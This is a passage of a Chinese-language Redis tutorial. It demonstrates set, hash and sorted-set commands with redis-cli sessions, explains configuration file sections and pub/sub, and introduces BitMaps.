(integer) 3
# smembers &lt;Key&gt; =&gt; &#x53D6;&#x51FA;&#x8BE5;&#x96C6;&#x5408;&#x7684;&#x6240;&#x6709;&#x503C;
127.0.0.1:6379&gt; smembers k1
1) &quot;v1&quot;
2) &quot;v3&quot;
3) &quot;v2&quot;
# sismember &lt;Key&gt; &lt;Value&gt; =&gt; &#x5224;&#x65AD;&#x8BE5;&#x96C6;&#x5408; Key &#x662F;&#x5426;&#x542B;&#x6709;&#x8BE5;&#x503C;
127.0.0.1:6379&gt; sismember k1 v1
(integer) 1
# scard &lt;Key&gt; =&gt; &#x8FD4;&#x56DE;&#x8BE5;&#x96C6;&#x5408;&#x7684;&#x5143;&#x7D20;&#x4E2A;&#x6570;
127.0.0.1:6379&gt; scard k1
(integer) 3
# srem &lt;Key&gt; &lt;Value&gt; &lt;Value&gt; =&gt; &#x5220;&#x9664;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x5143;&#x7D20;
127.0.0.1:6379&gt; srem k1 v1 v2
(integer) 2
# spop &lt;Key&gt; =&gt; &#x968F;&#x673A;&#x4ECE;&#x96C6;&#x5408;&#x4E2D;&#x53D6;&#x51FA;&#x4E00;&#x4E2A;&#x5143;&#x7D20;
127.0.0.1:6379&gt; spop k1
&quot;v3&quot;
# srandmember &lt;Key&gt; n =&gt; &#x968F;&#x5373;&#x4ECE;&#x8BE5;&#x96C6;&#x5408;&#x4E2D;&#x53D6;&#x51FA; n &#x4E2A;&#x503C;, &#x4F46;&#x662F;&#x4E0D;&#x4F1A;&#x4ECE;&#x96C6;&#x5408;&#x4E2D;&#x5220;&#x9664;
srandmember k1 2
1) &quot;v1&quot;
2) &quot;v3&quot;
# smove &lt;Key1&gt; &lt;Key2&gt; &lt;Value&gt; =&gt; &#x5C06;&#x4E00;&#x4E2A;&#x96C6;&#x5408;&#x7684;&#x67D0;&#x4E2A; Value &#x79FB;&#x52A8;&#x5230;&#x53E6;&#x4E00;&#x4E2A;&#x96C6;&#x5408;
127.0.0.1:6379&gt; sadd k2 v3 v4 v5
(integer) 3
127.0.0.1:6379&gt; smove k1 k2 v3
(integer) 1
127.0.0.1:6379&gt; smembers k1
1) &quot;v1&quot;
2) &quot;v2&quot;
127.0.0.1:6379&gt; smembers k2
1) &quot;v5&quot;
2) &quot;v3&quot;
3) &quot;v4&quot;
# sinter &lt;Key1&gt; &lt;Key2&gt; =&gt; &#x8FD4;&#x56DE;&#x4E24;&#x4E2A;&#x96C6;&#x5408;&#x7684;&#x4EA4;&#x96C6;&#x5143;&#x7D20;
127.0.0.1:6379&gt; sadd k3 v4 v6 v7
(integer) 3
127.0.0.1:6379&gt; sinter k2 k3
1) &quot;v4&quot;
# sunion &lt;Key1&gt; &lt;Key2&gt; =&gt; &#x8FD4;&#x56DE;&#x4E24;&#x4E2A;&#x96C6;&#x5408;&#x7684;&#x5E76;&#x96C6;&#x5143;&#x7D20;
127.0.0.1:6379&gt; sunion k2 k3
1) &quot;v3&quot;
2) &quot;v4&quot;
3) &quot;v5&quot;
4) &quot;v7&quot;
5) &quot;v6&quot;
# sdiff &lt;Key1&gt; &lt;Key2&gt; =&gt; &#x8FD4;&#x56DE;&#x4E24;&#x4E2A;&#x96C6;&#x5408;&#x7684;&#x5DEE;&#x96C6;&#x5143;&#x7D20; -&gt; Key1 &#x4E2D;&#x7684;&#x4E0D;&#x5728; Key2 &#x4E2D;&#x7684;
127.0.0.1:6379&gt; sdiff k2 k3
1) &quot;v5&quot;
2) &quot;v3&quot;
</code></pre>
<ul>
<li>Hash &#x54C8;&#x5E0C;</li>
</ul>
<p>Redis Hash &#x662F;&#x4E00;&#x4E2A; String &#x7C7B;&#x578B;&#x7684; field &#x548C; value &#x7684;&#x6620;&#x5C04;&#x8868;&#xFF0C;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x9002;&#x5408;&#x5B58;&#x50A8;&#x5BF9;&#x8C61;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x96C6;&#x5408;&#x3002;</p>
<pre><code class="language-shell"># hset &lt;Key&gt; &lt;Field&gt; &lt;Value&gt; =&gt; &#x7ED9; Key &#x96C6;&#x5408;&#x4E2D;&#x7684; Field &#x952E;&#x8D4B;&#x503C; Value
127.0.0.1:6379&gt; hset user:1001 id 1
(integer) 1
127.0.0.1:6379&gt; hset user:1001 name zs
(integer) 1
# hget &lt;Key1&gt; &lt;Field&gt; =&gt; &#x96C6;&#x5408; Field &#x53D6;&#x51FA; Value
127.0.0.1:6379&gt; hget user:1001 id
&quot;1&quot;
127.0.0.1:6379&gt; hget user:1001 name
&quot;zs&quot;
# hmset &lt;Key1&gt; &lt;Field1&gt; &lt;Value1&gt; &lt;Field2&gt; &lt;Value2&gt; =&gt; &#x6279;&#x91CF;&#x8BBE;&#x7F6E; Hash &#x7684;&#x503C;
127.0.0.1:6379&gt; hmset user:1002 id 2 name gz
OK
# hexists &lt;Key&gt; &lt;Field&gt; =&gt; &#x67E5;&#x770B;&#x54C8;&#x5E0C;&#x8868; Key &#x4E2D;&#x7ED9;&#x5B9A;&#x57DF; Field &#x662F;&#x5426;&#x5B58;&#x5728;
127.0.0.1:6379&gt; hexists user:1002 name
(integer) 1
# hkeys &lt;Key&gt; =&gt; &#x5217;&#x51FA;&#x8BE5; Hash &#x96C6;&#x5408;&#x7684;&#x6240;&#x6709; Field
127.0.0.1:6379&gt; hkeys user:1002
1) &quot;id&quot;
2) &quot;name&quot;
# hvals &lt;Key&gt; =&gt; &#x5217;&#x51FA;&#x8BE5; Hash &#x96C6;&#x5408;&#x7684;&#x6240;&#x6709; Value
127.0.0.1:6379&gt; hvals user:1002
1) &quot;2&quot;
2) &quot;gz&quot;
# hincrby &lt;Key&gt; &lt;Field&gt; increment =&gt; &#x4E3A;&#x54C8;&#x5E0C;&#x8868; Key &#x4E2D;&#x7684;&#x57DF; Field &#x7684;&#x503C;&#x52A0;&#x4E0A;&#x589E;&#x91CF;
127.0.0.1:6379&gt; hincrby user:1002 id 1
(integer) 3
# hsetnx &lt;Key&gt; &lt;Field&gt; &lt;Value&gt; =&gt; &#x5C06;&#x54C8;&#x5E0C;&#x8868; Key &#x4E2D;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x57DF; Field &#x7684;&#x503C;&#x8BBE;&#x7F6E;&#x4E3A; Value
127.0.0.1:6379&gt; hsetnx user:1002 age 22
(integer) 1
127.0.0.1:6379&gt; hkeys user:1002
1) &quot;id&quot;
2) &quot;name&quot;
3) &quot;age&quot;
</code></pre>
<p>Hash &#x7C7B;&#x578B;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x662F; ziplist &#x538B;&#x7F29;&#x5217;&#x8868;&#x3001;hashtable &#x54C8;&#x5E0C;&#x8868;&#x3002;&#x5F53; field-value &#x957F;&#x5EA6;&#x8F83;&#x77ED;&#x4E14;&#x4E2A;&#x6570;&#x8F83;&#x5C11;&#x65F6;&#xFF0C;&#x4F7F;&#x7528; ziplist&#xFF0C;&#x5426;&#x5219;&#x4F7F;&#x7528; hashtable&#x3002;</p>
<ul>
<li>SortedSet Zset &#x6709;&#x5E8F;&#x96C6;&#x5408;</li>
</ul>
<p>Redis zset &#x6709;&#x5E8F;&#x96C6;&#x5408;&#x662F;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;&#x91CD;&#x590D;&#x5143;&#x7D20;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x96C6;&#x5408;&#xFF0C;&#x5176;&#x5185;&#x6BCF;&#x4E2A;&#x6210;&#x5458;&#x90FD;&#x5173;&#x8054;&#x4E86;&#x4E00;&#x4E2A;&#x8BC4;&#x5206; Score&#xFF0C;&#x8FD9;&#x4E2A;&#x8BC4;&#x5206; Score &#x88AB;&#x7528;&#x6765;&#x6309;&#x7167;&#x987A;&#x5E8F;&#x6392;&#x5E8F;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x6210;&#x5458;&#x3002;&#x6210;&#x5458;&#x552F;&#x4E00;&#xFF0C;&#x4F46;&#x8BC4;&#x5206;&#x53EF;&#x4EE5;&#x91CD;&#x590D;&#x3002;</p>
<p>zset &#x5E95;&#x5C42;&#x4F7F;&#x7528; hash &#x548C;&#x8DF3;&#x8DC3;&#x8868;&#x3002;&#x524D;&#x8005;&#x5173;&#x8054;&#x5143;&#x7D20; value &#x548C;&#x6743;&#x91CD; score&#xFF0C;&#x4FDD;&#x969C; value &#x7684;&#x552F;&#x4E00;&#x6027;&#xFF0C;&#x5E76;&#x80FD;&#x6839;&#x636E; value &#x627E;&#x5230;&#x76F8;&#x5E94;&#x7684; score &#x503C;&#x3002;&#x540E;&#x8005;&#x76EE;&#x7684;&#x7ED9; value &#x6392;&#x5E8F;&#xFF0C;&#x6839;&#x636E; score &#x7684;&#x8303;&#x56F4;&#x83B7;&#x53D6;&#x5143;&#x7D20;&#x5217;&#x8868;&#x3002;</p>
<pre><code class="language-shell"># zadd &lt;Key&gt; &lt;Score1&gt; &lt;Value1&gt; &lt;Score2&gt; &lt;Value2&gt; =&gt; &#x5C06;&#x4E00;&#x6216;&#x591A;&#x4E2A; member &#x5143;&#x7D20;&#x53CA;&#x5176; score &#x503C;&#x52A0;&#x5165;&#x5230;&#x6709;&#x5E8F; Key &#x4E2D;
127.0.0.1:6379&gt; zadd topn 2 java 3 cpp 4 node 5 php
(integer) 4
# zrange &lt;Key&gt; start stop (withscores) =&gt; &#x8FD4;&#x56DE;&#x6709;&#x5E8F;&#x96C6;key&#xFF0C;&#x4E0B;&#x6807;&#x5728;start&#x4E0E;stop&#x4E4B;&#x95F4;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x5E26;withscores&#xFF0C;&#x53EF;&#x4EE5;&#x8BA9;&#x5206;&#x6570;&#x4E00;&#x8D77;&#x548C;&#x503C;&#x8FD4;&#x56DE;&#x5230;&#x7ED3;&#x679C;&#x96C6;&#x3002;
127.0.0.1:6379&gt; zrange topn 0 -1
1) &quot;java&quot;
2) &quot;cpp&quot;
3) &quot;node&quot;
4) &quot;php&quot;
127.0.0.1:6379&gt; zrange topn 0 -1 withscores
1) &quot;java&quot;
2) &quot;2&quot;
3) &quot;cpp&quot;
4) &quot;3&quot;
5) &quot;node&quot;
6) &quot;4&quot;
7) &quot;php&quot;
8) &quot;5&quot;
# zrangebyscore &lt;Key&gt; min max (withscores) =&gt; &#x8FD4;&#x56DE;&#x6709;&#x5E8F;&#x96C6; Key -&gt; &#x6240;&#x6709; Score &#x503C;&#x4ECB;&#x4E8E; Min &#x548C; Max &#x4E4B;&#x95F4;&#x7684;&#x6210;&#x5458; -&gt; &#x4ECE;&#x5C0F;&#x5230;&#x5927;
127.0.0.1:6379&gt; zrangebyscore topn 3 5
1) &quot;cpp&quot;
2) &quot;node&quot;
3) &quot;php&quot;
# zrevrangebyscore &lt;Key&gt; max min (withscores) =&gt;  &#x8FD4;&#x56DE;&#x6709;&#x5E8F;&#x96C6; Key -&gt; &#x6240;&#x6709; Score &#x503C;&#x4ECB;&#x4E8E; Min &#x548C; Max &#x4E4B;&#x95F4;&#x7684;&#x6210;&#x5458; -&gt; &#x4ECE;&#x5927;&#x5230;&#x5C0F;
127.0.0.1:6379&gt; zrevrangebyscore topn 5 2
1) &quot;php&quot;
2) &quot;node&quot;
3) &quot;cpp&quot;
4) &quot;java&quot;
# zincrby &lt;Key&gt; increment &lt;Value&gt; =&gt; &#x4E3A;&#x5143;&#x7D20;&#x7684; Score &#x52A0;&#x4E0A;&#x589E;&#x91CF;
127.0.0.1:6379&gt; zincrby topn 5 java
&quot;7&quot;
# zrem &lt;Key&gt; &lt;Value&gt; =&gt; &#x5220;&#x9664;&#x8BE5;&#x96C6;&#x5408;&#x4E0B;&#x6307;&#x5B9A;&#x503C;&#x7684;&#x5143;&#x7D20;
127.0.0.1:6379&gt; zrem topn php
(integer) 1
# zcount &lt;Key&gt; min max =&gt; &#x7EDF;&#x8BA1;&#x8BE5;&#x96C6;&#x5408;&#x5206;&#x6570;&#x533A;&#x95F4;&#x5185;&#x7684;&#x5143;&#x7D20;&#x4E2A;&#x6570;
127.0.0.1:6379&gt; zcount topn 2 3
(integer) 1
# zrank &lt;Key&gt; &lt;Value&gt; =&gt; &#x8FD4;&#x56DE;&#x8BE5;&#x503C;&#x5728;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x6392;&#x540D; -&gt; &#x4ECE;0&#x5F00;&#x59CB;
127.0.0.1:6379&gt; zrank topn java
(integer) 2
127.0.0.1:6379&gt; zrank topn cpp
(integer) 0
</code></pre>
<h3 id="redis-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">Redis &#x914D;&#x7F6E;&#x6587;&#x4EF6;</h3>
<ul>
<li>
<p>Units =&gt; &#x914D;&#x7F6E;&#x7684;&#x5927;&#x5C0F;&#x5355;&#x4F4D;&#xFF0C;&#x53EA;&#x652F;&#x6301; bytes&#xFF0C;&#x4E0D;&#x652F;&#x6301; bit&#xFF0C;&#x5927;&#x5C0F;&#x5199;&#x4E0D;&#x654F;&#x611F;&#x3002;</p>
</li>
<li>
<p>INCLUDES =&gt; &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x53EF;&#x4F5C;&#x4E3A;&#x603B;&#x95F8;&#x5305;&#x542B;&#x5176;&#x4ED6;&#x6587;&#x4EF6;&#x3002;</p>
</li>
</ul>
<p>&#x5E38;&#x7528;&#x4E8E;&#x5728;&#x4FDD;&#x6301;&#x540C;&#x4E00;&#x4E3B;&#x673A;&#x4E0A;&#x7684;&#x591A;&#x4E2A;&#x5B9E;&#x4F8B;&#x4E4B;&#x95F4;&#x4F7F;&#x7528;&#x76F8;&#x540C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x8BA9;&#x6BCF;&#x4E2A;&#x5B9E;&#x4F8B;&#x53C8;&#x62E5;&#x6709;&#x5404;&#x81EA;&#x7279;&#x70B9;&#x7684;&#x914D;&#x7F6E;&#x3002;</p>
<ul>
<li>NETWORK</li>
</ul>
<p>bind=127.0.0.1 =&gt; &#x53EA;&#x63A5;&#x6536;&#x672C;&#x673A;&#x7684;&#x8BBF;&#x95EE;&#x8BF7;&#x6C42;&#xFF0C;&#x4E0D;&#x5199;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x65E0;&#x9650;&#x5236;&#x63A5;&#x6536;&#x4EFB;&#x4F55;&#x5730;&#x5740;&#x7684;&#x8BBF;&#x95EE;&#x3002;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x5E38;&#x5C06;&#x5176;&#x6CE8;&#x91CA;&#x3002;</p>
<p>protect-mode =&gt; &#x6CA1;&#x6709;&#x8BBE;&#x5B9A; bind ip &#x4E0E;&#x5BC6;&#x7801;&#x65F6;&#xFF0C;&#x53EA;&#x5141;&#x8BB8;&#x63A5;&#x6536;&#x672C;&#x673A;&#x7684;&#x54CD;&#x5E94;&#x3002;</p>
<p>backlog =&gt; &#x8FDE;&#x63A5;&#x961F;&#x5217;&#x3002;&#x5176;&#x961F;&#x5217;&#x603B;&#x548C; = &#x672A;&#x5B8C;&#x6210;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x961F;&#x5217; + &#x5DF2;&#x5B8C;&#x6210;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x961F;&#x5217;&#x3002;&#x9AD8;&#x5E76;&#x53D1;&#x73AF;&#x5883;&#x5E94;&#x63D0;&#x9AD8;&#x6B64;&#x503C;&#x4EE5;&#x907F;&#x514D;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x7684;&#x901F;&#x5EA6;&#x95EE;&#x9898;&#x3002;</p>
<blockquote>
<p>&#x901A;&#x5E38; /proc/sys/net/core/somaxconn &#x503C;&#x662F;&#x56FA;&#x5B9A;&#x7684; 128&#xFF0C;&#x9AD8;&#x5E76;&#x53D1;&#x60C5;&#x51B5;&#x4E0B;&#x5E94;&#x589E;&#x5927; /proc/sys/net/core/somaxconn &amp; /proc/sys/net/ipv4/tcp_max_syn_backlog&#x3002;</p>
</blockquote>
<p>timeout 300 =&gt; &#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x95F2;&#x7F6E;&#x6307;&#x5B9A;&#x65F6;&#x95F4;&#x540E;&#x5173;&#x95ED;&#x8FDE;&#x63A5; -&gt; 0 &#x8868;&#x793A;&#x5173;&#x95ED;&#x8BE5;&#x529F;&#x80FD;&#x3002;</p>
<ul>
<li>GENERAL</li>
</ul>
<p>daemonize =&gt; &#x540E;&#x53F0;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF1B;pidfile =&gt; &#x5B58;&#x653E;&#x8FDB;&#x7A0B;&#x53F7;&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x6BCF;&#x4E2A;&#x5B9E;&#x4F8B;&#x7684;&#x4EA7;&#x751F;&#x90FD;&#x4E0D;&#x540C;&#x3002;&#x4EE5;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x65B9;&#x5F0F;&#x8FD0;&#x884C;&#x65F6;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F1A;&#x628A; pid &#x5199;&#x5165; /var/run/redis.pid &#x6587;&#x4EF6;&#xFF0C;&#x53EF;&#x6307;&#x5B9A; pidfile /var/run/redis.pid&#x3002;</p>
<ul>
<li>LIMITS</li>
</ul>
<p>maxclients &#x8BBE;&#x7F6E; Redis &#x540C;&#x65F6;&#x53EF;&#x4E0E;&#x591A;&#x5C11;&#x5BA2;&#x6237;&#x7AEF;&#x8FDB;&#x884C;&#x8FDE;&#x63A5;&#xFF0C;&#x9ED8;&#x8BA4; 10000 &#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x82E5;&#x8FBE;&#x5230;&#x6B64;&#x9650;&#x5236;&#xFF0C;redis &#x5219;&#x4F1A;&#x62D2;&#x7EDD;&#x65B0;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#xFF0C;&#x5E76;&#x4E14;&#x5411;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x65B9;&#x53D1;&#x51FA; max number of clients reached &#x4EE5;&#x4F5C;&#x56DE;&#x5E94;&#x3002;</p>
<p>maxmemory &#x6307;&#x5B9A; Redis &#x6700;&#x5927;&#x5185;&#x5B58;&#x9650;&#x5236;&#xFF0C;&#x5EFA;&#x8BAE;&#x5FC5;&#x987B;&#x8BBE;&#x7F6E;&#xFF0C;&#x5426;&#x5219;&#x5185;&#x5B58;&#x5360;&#x6EE1;&#x4F1A;&#x9020;&#x6210;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x3002;&#x82E5;&#x8FBE;&#x5230; Redis &#x53EF;&#x4F7F;&#x7528;&#x5185;&#x5B58;&#x4E0A;&#x9650;&#xFF0C;&#x5219;&#x4F1A;&#x8BD5;&#x56FE;&#x79FB;&#x9664;&#x5185;&#x90E8;&#x6570;&#x636E;&#xFF0C;&#x79FB;&#x9664;&#x89C4;&#x5219;&#x53EF;&#x901A;&#x8FC7; maxmemory-policy &#x6307;&#x5B9A;&#x3002;</p>
<blockquote>
<p>Maxmemory-policy<br>
&#xFF08;1&#xFF09;volatile-lru =&gt; &#x4F7F;&#x7528; LRU &#x7B97;&#x6CD5;&#x79FB;&#x9664; Key&#xFF08;&#x53EA;&#x9488;&#x5BF9;&#x8BBE;&#x7F6E;&#x4E86;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x7684;&#x952E;&#xFF09;<br>
&#xFF08;2&#xFF09;allkeys-lru =&gt; &#x4F7F;&#x7528; LRU &#x7B97;&#x6CD5;&#x79FB;&#x9664; Key<br>
&#xFF08;3&#xFF09;volatile-random =&gt; &#x968F;&#x673A;&#x79FB;&#x9664;&#x8FC7;&#x671F;&#x96C6;&#x5408;&#x4E2D;&#x7684; Key<br>
&#xFF08;4&#xFF09;allkeys-random =&gt; &#x968F;&#x673A;&#x7684;&#x79FB;&#x9664; Key<br>
&#xFF08;5&#xFF09;volatile-ttl =&gt; &#x79FB;&#x9664; TTL &#x503C;&#x6700;&#x5C0F;&#x7684; Key&#xFF0C;&#x5373;&#x90A3;&#x4E9B;&#x6700;&#x8FD1;&#x8981;&#x8FC7;&#x671F;&#x7684; Key<br>
&#xFF08;6&#xFF09;noeviction =&gt; &#x4E0D;&#x8FDB;&#x884C;&#x79FB;&#x9664;&#x3002;&#x9488;&#x5BF9;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x53EA;&#x8FD4;&#x56DE;&#x9519;&#x8BEF;&#x4FE1;&#x606F;</p>
</blockquote>
<p>Maxmemory-samples &#x8BBE;&#x7F6E;&#x6837;&#x672C;&#x6570;&#x91CF;&#x3002;&#x4E00;&#x822C;&#x8BBE;&#x7F6E; 3-7 &#x7684;&#x6570;&#x5B57;&#xFF0C;&#x867D;&#x7136;&#x6837;&#x672C;&#x8D8A;&#x5C0F;&#x8D8A;&#x4E0D;&#x7CBE;&#x786E;&#xFF0C;&#x4F46;&#x662F;&#x6027;&#x80FD;&#x6D88;&#x8017;&#x66F4;&#x5C0F;&#x3002;</p>
<ul>
<li>REPLICATION</li>
</ul>
<p>slaveof &lt;masterip&gt; &lt;masterport&gt; &#x8BBE;&#x7F6E;&#x5F53;&#x672C;&#x673A;&#x4E3A; slav &#x670D;&#x52A1;&#x65F6;&#xFF0C;&#x8BBE;&#x7F6E; master &#x670D;&#x52A1;&#x7684; IP &#x5730;&#x5740;&#x53CA;&#x7AEF;&#x53E3;&#xFF0C;&#x5728; Redis &#x542F;&#x52A8;&#x65F6;&#x81EA;&#x52A8;&#x4ECE; master &#x8FDB;&#x884C;&#x6570;&#x636E;&#x540C;&#x6B65;&#x3002;&#x5728; RedisV7 &#x4E2D;&#x6539;&#x6210; replicaof &lt;masterip&gt; &lt;masterport&gt;&#x3002;</p>
<p>masterauth &lt;master-password&gt; &#x662F;&#x5F53; master &#x670D;&#x52A1;&#x8BBE;&#x7F6E;&#x4E86;&#x5BC6;&#x7801;&#x4FDD;&#x62A4;&#x65F6;&#xFF0C;slav &#x670D;&#x52A1;&#x8FDE;&#x63A5;master &#x7684;&#x5BC6;&#x7801;&#x3002;</p>
<pre><code class="language-conf"># masterauth &lt;master-password&gt;
</code></pre>
<ul>
<li>SECURITY</li>
</ul>
<p>requirepass foobared &#x8BBE;&#x7F6E; Redis &#x8FDE;&#x63A5;&#x5BC6;&#x7801;&#x3002;&#x5982;&#x679C;&#x914D;&#x7F6E;&#x4E86;&#x8FDE;&#x63A5;&#x5BC6;&#x7801;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x8FDE;&#x63A5;&#x65F6;&#x9700;&#x8981;&#x901A;&#x8FC7; AUTH &lt;password&gt; &#x547D;&#x4EE4;&#x63D0;&#x4F9B;&#x5BC6;&#x7801;&#xFF0C;&#x9ED8;&#x8BA4;&#x5173;&#x95ED;&#x3002;</p>
<pre><code class="language-conf"># requirepass foobared
</code></pre>
<ul>
<li>ADVANCED CONFIG</li>
</ul>
<p>activerehashing yes &#x6307;&#x5B9A;&#x662F;&#x5426;&#x6FC0;&#x6D3B;&#x91CD;&#x7F6E;&#x54C8;&#x5E0C;&#xFF0C;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;&#x3002;</p>
<p>hash-max-listpack &#x6307;&#x5B9A;&#x5728;&#x8D85;&#x8FC7;&#x4E00;&#x5B9A;&#x7684;&#x6570;&#x91CF;&#x6216;&#x6700;&#x5927;&#x7684;&#x5143;&#x7D20;&#x8D85;&#x8FC7;&#x67D0;&#x4E00;&#x4E34;&#x754C;&#x503C;&#x65F6;&#xFF0C;&#x91C7;&#x7528;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x7684;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x3002;&#x65E7;&#x7248;&#x672C;&#x662F; hash-max-zipmap&#x3002;</p>
<pre><code class="language-conf"># Hashes are encoded using a memory efficient data structure when they have a
# small number of entries, and the biggest entry does not exceed a given
# threshold. These thresholds can be configured using the following directives.
hash-max-listpack-entries 512
hash-max-listpack-value 64
</code></pre>
<h3 id="%E5%8F%91%E5%B8%83%E5%92%8C%E8%AE%A2%E9%98%85">&#x53D1;&#x5E03;&#x548C;&#x8BA2;&#x9605;</h3>
<p>Redis &#x5177;&#x5907;&#x53D1;&#x5E03;&#x8BA2;&#x9605;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x662F;&#x5176;&#x4E3B;&#x8981;&#x4EFB;&#x52A1;&#x8FD8;&#x662F;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x7F13;&#x5B58;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x79CD;&#x8BA2;&#x9605;&#x53D1;&#x5E03;&#x5E38;&#x7531;&#x4E13;&#x95E8;&#x7684; kafka&#x3001;activemq &#x7B49;&#x6D88;&#x606F;&#x4E2D;&#x95F4;&#x4EF6;&#x6765;&#x5B8C;&#x6210;&#x3002;</p>
<pre><code class="language-shell"># &#x89C6;&#x7A97;&#x4E00;
$ /usr/local/bin/redis-cli
# &#x8BA2;&#x9605;&#x9891;&#x9053;
127.0.0.1:6379&gt; SUBSCRIBE channel1
Reading messages... (press Ctrl-C to quit)
1) &quot;subscribe&quot;
2) &quot;channel1&quot;
3) (integer) 1
1) &quot;message&quot;
2) &quot;channel1&quot;
3) &quot;helloChannel1&quot;
# &#x89C6;&#x7A97;&#x4E8C;
# &#x53D1;&#x5E03;&#x4FE1;&#x606F;
PUBLISH channel1 helloChannel1
(integer) 1
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="redis6-%E6%96%B0%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">Redis6 &#x65B0;&#x6570;&#x636E;&#x7C7B;&#x578B;</h2>
<h3 id="bitmaps">BitMaps</h3>
<p>BitMaps &#x672C;&#x8EAB;&#x4E0D;&#x662F;&#x4E00;&#x79CD;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x800C;&#x662F;&#x5B57;&#x7B26;&#x4E32; Key-Value&#xFF0C;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x5BF9;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x4F4D;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x3002;&#x7C7B;&#x4F3C; &quot;abc&quot; &#x5B57;&#x7B26;&#x4E32;&#x662F;&#x4E09;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x6BCF;&#x4E2A;&#x5B57;&#x8282; 8 &#x4F4D;&#xFF0C;&#x5728;&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#x901A;&#x8FC7; ASCII &#x7801; 97&#x3001;98&#x3001;99 &#x8F6C;&#x6362;&#x4E3A;&#x5BF9;&#x5E94;&#x4E8C;&#x8FDB;&#x5236; 01100001&#x3001;01100010&#x3001;01100011&#x3002;&#x901A;&#x8FC7;&#x5408;&#x7406;&#x7684;&#x64CD;&#x4F5C;&#x4F4D;&#x63D0;&#x9AD8;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#x548C;&#x5F00;&#x53D1;&#x6548;&#x7387;&#x3002;</p>
<p>BitMaps &#x53EF;&#x89C6;&#x4F5C;&#x4E00;&#x4E2A;&#x4EE5;&#x4F4D;&#x4E3A;&#x5355;&#x4F4D;&#x7684;&#x6570;&#x7EC4;&#xFF0C;&#x6570;&#x7EC4;&#x4E2D;&#x6BCF;&#x4E2A;&#x5355;&#x5143;&#x53EA;&#x5B58;&#x50A8; 0 &#x548C; 1&#xFF0C;&#x6570;&#x7EC4;&#x4E0B;&#x6807;&#x4E3A;&#x504F;&#x79FB;&#x91CF;&#x3002;<code>setbit &lt;Key&gt; &lt;Offset&gt; &lt;Value&gt;</code> &#x8BBE;&#x7F6E; bitmaps &#x4E2D;&#x67D0;&#x4E2A;&#x504F;&#x79FB;&#x91CF;&#x7684;&#x503C; 0 &#x6216; 1&#x3002;<code>getbit &lt;Key&gt; &lt;Offset&gt;</code> &#x83B7;&#x53D6; bitmaps &#x4E2D;&#x67D0;&#x4E2A;&#x504F;&#x79FB;&#x91CF;&#x7684;&#x503C;&#x3002;<code>bitcount &lt;Key&gt; [start end]</code> &#x7EDF;&#x8BA1;&#x5B57;&#x7B26;&#x4E32;&#x4ECE; start &#x5230; end &#x88AB;&#x8BBE;&#x7F6E;&#x4E3A; 1 &#x7684; bit &#x6570;&#x3002;&#x591A; bitmaps &#x96C6;&#x5408;&#x8FD0;&#x7B97; <code>bitop and|or|not|xor &lt;DestKey&gt; [Key...]</code> &#x7ED3;&#x679C;&#x4FDD;&#x5B58; DestKey&#x3002;</p>
<p>&#x5E38;&#x5E94;&#x7528;&#x5C06;&#x6BCF;&#x4E2A;&#x72EC;&#x7ACB;&#x7528;&#x6237;&#x662F;&#x5426;&#x8BBF;&#x95EE;&#x8FC7;&#x7F51;&#x7AD9;&#x5B58;&#x653E;&#x5728; BitMaps&#xFF0C;&#x5C06;&#x8BBF;&#x95EE;&#x7684;&#x7528;&#x6237;&#x8BB0;&#x4F5C; 1&#xFF0C;&#x6CA1;&#x6709;&#x8BBF;&#x95EE;&#x7684;&#x7528;&#x6237;&#x8BB0;&#x4F5C; 0&#xFF0C;&#x504F;&#x79FB;&#x91CF;&#x4F5C;&#x4E3A;&#x7528;&#x6237; id&#x3002;</p>
